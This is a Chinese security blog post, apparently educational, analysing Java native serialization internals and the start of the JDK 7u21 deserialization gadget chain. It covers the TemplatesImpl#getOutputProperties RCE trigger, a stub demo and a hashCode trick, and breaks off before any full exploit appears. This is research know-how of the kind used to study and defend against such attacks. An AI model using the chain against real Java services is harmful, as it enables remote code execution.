<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="本篇梳理了 Java 原生反序列化相关知识，同时分析了 JDK 7u21利用链">
<meta property="og:type" content="article">
<meta property="og:title" content="深入 Java 原生反序列化 &amp; JDK7u21 利用链分析">
<meta property="og:url" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="M13n&#39;s Blog">
<meta property="og:description" content="本篇梳理了 Java 原生反序列化相关知识，同时分析了 JDK 7u21利用链">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214150708996.png">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214151252315.png">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/u4inn.png">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/abfd01ca-62cc-4ad9-80e0-c7ce8fee9d51.png-w331s">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214155858889.png">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210216155234182.png">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214172424266.png">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214174341040.png">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214175058607.png">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210216162034161.png">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210219204734743.png">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220151023288.png">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220160741224.png">
<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220162047284.png">
<meta property="article:published_time" content="2021-02-14T11:14:41.000Z">
<meta property="article:modified_time" content="2021-02-28T10:21:05.302Z">
<meta property="article:author" content="M13n">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214150708996.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>深入 Java 原生反序列化 &amp; JDK7u21 利用链分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&text=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&is_video=false&description=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析&body=Check out this article: http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&name=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析&description=&lt;p&gt;本篇梳理了 Java 原生反序列化相关知识，同时分析了 JDK 7u21利用链&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&t=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Serialization-and-Deserialization"><span class="toc-number">1.</span> <span class="toc-text">Serialization and Deserialization</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JDK-7u21-Gadget-Chain"><span class="toc-number">2.</span> <span class="toc-text">JDK 7u21 Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basics"><span class="toc-number">2.1.</span> <span class="toc-text">Basics</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget-chain"><span class="toc-number">2.2.</span> <span class="toc-text">Gadget chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FIX"><span class="toc-number">2.3.</span> <span class="toc-text">FIX</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REF"><span class="toc-number">3.</span> <span class="toc-text">REF</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        深入 Java 原生反序列化 &amp; JDK7u21 利用链分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">M13n's Blog</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-02-14T11:14:41.000Z" itemprop="datePublished">2021-02-14</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Java-Sec/">Java Sec</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Java/" rel="tag">Java</a>, <a class="tag-link-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>本篇梳理了 Java 原生反序列化相关知识，同时分析了 JDK 7u21利用链</p>
<span id="more"></span>

<h1 id="Serialization-and-Deserialization"><a href="#Serialization-and-Deserialization" class="headerlink" title="Serialization and Deserialization"></a>Serialization and Deserialization</h1><p>参考网上文章梳理了一些序列化和反序列化的细节</p>
<p><strong>Java 序列化将一个对象转换为二进制，反序列化将一个二进制恢复成对象</strong></p>
<p>首先看一下序列化之后到底有什么内容被写入了二进制数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stringField;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SerializationDemo</span><span class="params">(String s, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = s;</span><br><span class="line">        <span class="keyword">this</span>.intField = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oops = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./serializable.ser&quot;</span>));</span><br><span class="line">        oops.writeObject(<span class="keyword">new</span> SerializationDemo(<span class="string">&quot;Min&quot;</span>, <span class="keyword">new</span> Random().nextInt(<span class="number">20</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>SerializationDumper    </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 51 - 0x00 33</span><br><span class="line">        Value - com.p2hm1n.deserialization.basics.SerializationDemo - 0x636f6d2e7032686d316e2e646573657269616c697a6174696f6e2e6261736963732e53657269616c697a6174696f6e44656d6f</span><br><span class="line">      serialVersionUID - 0xf1 6f 46 2a 38 38 6b 46</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 2 - 0x00 02</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 8 - 0x00 08</span><br><span class="line">            Value - intField - 0x696e744669656c64</span><br><span class="line">        1:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 11 - 0x00 0b</span><br><span class="line">            Value - stringField - 0x737472696e674669656c64</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      com.p2hm1n.deserialization.basics.SerializationDemo</span><br><span class="line">        values</span><br><span class="line">          intField</span><br><span class="line">            (int)10 - 0x00 00 00 0a</span><br><span class="line">          stringField</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 3 - 0x00 03</span><br><span class="line">                Value - Min - 0x4d696e</span><br></pre></td></tr></table></figure>



<ul>
<li><code>0xaced</code>，魔术头</li>
<li><code>0x0005</code>，版本号 <em>（JDK主流版本一致，下文如无特殊标注，都以JDK8u为例）</em></li>
<li><code>0x73</code>，对象类型标识 <em>（<code>0x7n</code>基本上都定义了类型标识符常量，但也要看出现的位置，毕竟它们都在可见字符的范围，详见<code>java.io.ObjectStreamConstants</code>）</em></li>
<li><code>0x72</code>，类描述符标识</li>
<li><code>0x0033...</code>，类名字符串长度和值 <em>（Java序列化中的UTF8格式标准）</em></li>
<li><code>0xf16f462a38386b46</code>，序列版本唯一标识 <em>（<code>serialVersionUID</code>，简称SUID）</em></li>
<li><code>0x02</code>，对象的序列化属性标志位，如是否是Block Data模式、自定义<code>writeObject()</code>，<code>Serializable</code>、<code>Externalizable</code>或<code>Enum</code>类型等</li>
<li><code>0x0002</code>，类的字段个数</li>
<li><code>0x49</code>，整数类型签名的第一个字节，同理，之后的<code>0x4c</code>为字符串类型签名的第一个字节 <em>（类型签名表示与JVM规范中的定义相同）</em></li>
<li><code>0x0008...</code>，字段名字符串长度和值，非原始数据类型的字段还会在后面加上数据类型标识、完整类型签名长度和值</li>
<li><code>0x78</code> Block Data结束标识</li>
<li><code>0x70</code> 父类描述符标识，此处为<code>null</code></li>
<li><code>0x0000000a</code> 整数字段<code>intField</code>的值 <em>（Java序列化中的整数格式标准）</em> ，非原始数据类型的字段则会按对象的方式处理，如之后的字符串字段<code>stringField</code>被识别为字符串类型，输出字符串类型标识、字符串长度和值</li>
</ul>
<p><strong>序列化的执行流程</strong></p>
<ol>
<li><code>ObjectOutputStream</code>实例初始化时，将魔术头和版本号写入<code>bout</code> <em>（<code>BlockDataOutputStream</code>类型）</em> 中</li>
<li>调用 <code>ObjectOutputStream.writeObject()</code>开始写对象数据<ul>
<li><code>ObjectStreamClass.lookup()</code>封装待序列化的类描述 <em>（返回<code>ObjectStreamClass</code>类型）</em> ，获取包括类名、自定义<code>serialVersionUID</code>、可序列化字段 <em>（返回<code>ObjectStreamField</code>类型）</em> 和构造方法，以及<code>writeObject</code>、<code>readObject</code>方法等</li>
<li><code>writeOrdinaryObject()</code>写入对象数据<ul>
<li>写入对象类型标识</li>
<li><code>writeClassDesc()</code>进入分支<code>writeNonProxyDesc()</code>写入类描述数据<ul>
<li>写入类描述符标识</li>
<li>写入类名</li>
<li>写入SUID <em>（当SUID为空时，会进行计算并赋值，细节见下面关于SerialVersionUID章节）</em></li>
<li>计算并写入序列化属性标志位</li>
<li>写入字段信息数据</li>
<li>写入Block Data结束标识</li>
<li>写入父类描述数据</li>
</ul>
</li>
<li><code>writeSerialData()</code>写入对象的序列化数据<ul>
<li>若类自定义了<code>writeObject()</code>，则调用该方法写对象，否则调用<code>defaultWriteFields()</code>写入对象的字段数据 <em>（若是非原始类型，则递归处理子对象）</em></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>反序列化的执行流程</strong></p>
<ol>
<li><code>ObjectInputStream</code>实例初始化时，读取魔术头和版本号进行校验</li>
<li>调用<code>ObjectInputStream.readObject()</code>开始读对象数据<ul>
<li>读取对象类型标识</li>
<li><code>readOrdinaryObject()</code>读取数据对象<ul>
<li><code>readClassDesc()</code>读取类描述数据<ul>
<li>读取类描述符标识，进入分支<code>readNonProxyDesc()</code></li>
<li>读取类名</li>
<li>读取SUID</li>
<li>读取并分解序列化属性标志位</li>
<li>读取字段信息数据</li>
<li><code>resolveClass()</code>根据类名获取待反序列化的类的<code>Class</code>对象，如果获取失&gt; 败，则抛出<code>ClassNotFoundException</code></li>
<li><code>skipCustomData()</code>循环读取字节直到Block Data结束标识为止</li>
<li>读取父类描述数据</li>
<li><code>initNonProxy()</code>中判断对象与本地对象的SUID和类名 <em>（不含包名）</em> 是否相同，若不同，则抛出<code>InvalidClassException</code></li>
</ul>
</li>
<li><code>ObjectStreamClass.newInstance()</code>获取并调用离对象最近的非<code>Serializable</code>的父类的无参构造方法 <em>（若不存在，则返回<code>null</code>）</em> 创建对象实例</li>
<li><code>readSerialData()</code>读取对象的序列化数据<ul>
<li>若类自定义了<code>readObject()</code>，则调用该方法读对象，否则调用<code>defaultReadFields()</code>读取并填充对象的字段数据</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>补充一个细节是在进行反序列化的过程中这里进行了判断</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214150708996.png"></p>
<p>如果满足 <code>hasReadObjectMethod</code> 的条件，会调用 <code>invokeReadObject</code></p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214151252315.png"></p>
<p>引用 @l1nk3r 师傅的总结</p>
<blockquote>
<p>是否重写了 <strong>readObject</strong> 影响的是 <strong>slotDesc.hasReadObjectMethod()</strong> 的结果</p>
<p>如果反序列化的过程中被反序列化类重写了 <strong>readObject</strong> ，该数据在反序列化的过程中核心流程走到 <strong>readSerialData</strong> 方法中的 <strong>slotDesc.invokeReadObject</strong> 方法，通过反射机制触发相关流程，并且调用重写的 <strong>readObject</strong> 。如果没有重写 <strong>readObject</strong> ，则调用 <strong>ObjectInputStream</strong> 类中的 <strong>readObject</strong> 方法，并且执行反序列化</p>
</blockquote>
<p>同时补一张流程图</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/u4inn.png"></p>
<p>更为详细的流程分析可以看以下文章：</p>
<p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2019/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%B7%B1%E7%A9%B6/">Java反序列化过程深究</a></p>
<p><a target="_blank" rel="noopener" href="http://redteam.today/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#%E5%89%8D%E8%A8%80">Java原生序列化与反序列化代码简要分析</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md">浅析Java序列化和反序列化</a></p>
<h1 id="JDK-7u21-Gadget-Chain"><a href="#JDK-7u21-Gadget-Chain" class="headerlink" title="JDK 7u21 Gadget Chain"></a>JDK 7u21 Gadget Chain</h1><h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><p>大致几点可以看一下 @天融信阿尔法实验室 这个脑图 </p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/abfd01ca-62cc-4ad9-80e0-c7ce8fee9d51.png-w331s"></p>
<p>CC 中我们也用到了通过 javassist 构造  Static Initializers，回顾我们之前构造调用 <code>TemplatesImpl#newTransformer</code> 结合 javassist 实现的一个 RCE 的 demo，当时的思路是用 <code>IvokerTransformer#transform</code> 去触发 <code>TemplatesImpl#newTransformer</code> 来达到 RCE</p>
<p>回看 <code>TemplatesImpl</code> 其他方法，其实调用了  <code>TemplatesImpl#newTransformer</code>  的也能 RCE，比如我们这里 <code>TemplatesImpl#getOutputProperties</code></p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214155858889.png"></p>
<p>由此我们实现第一个 RCE demo</p>
<p><strong>Level-0 demo</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// javassist fake Code</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>另一个需要关注的点是 hashCode 的一个小 trick，<code>f5a5a608</code> 的 hashCode 值为 0</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210216155234182.png"></p>
<h2 id="Gadget-chain"><a href="#Gadget-chain" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p>看一下 <code>javax.xml.transform.Templates</code> ，里面有两个方法都是我们想调用的，意味着只要能循环打印这个 interface 的方法，并在某个类调用这个方法，我们即可 RCE</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214172424266.png"></p>
